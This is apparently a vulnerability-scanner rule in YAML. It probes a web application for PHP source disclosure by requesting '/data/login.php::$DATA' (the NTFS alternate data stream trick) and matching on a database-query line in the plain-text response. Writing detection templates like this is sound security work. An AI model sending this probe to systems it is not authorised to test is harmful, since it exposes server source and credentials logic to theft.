transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /data/login.php::$DATA
        expression: response.status == 200 && response.body.bcontains(bytes("$dbQuery = new DataBaseQuery()")) && response.headers['Content-Type']=="text/plain"
expression: r0()
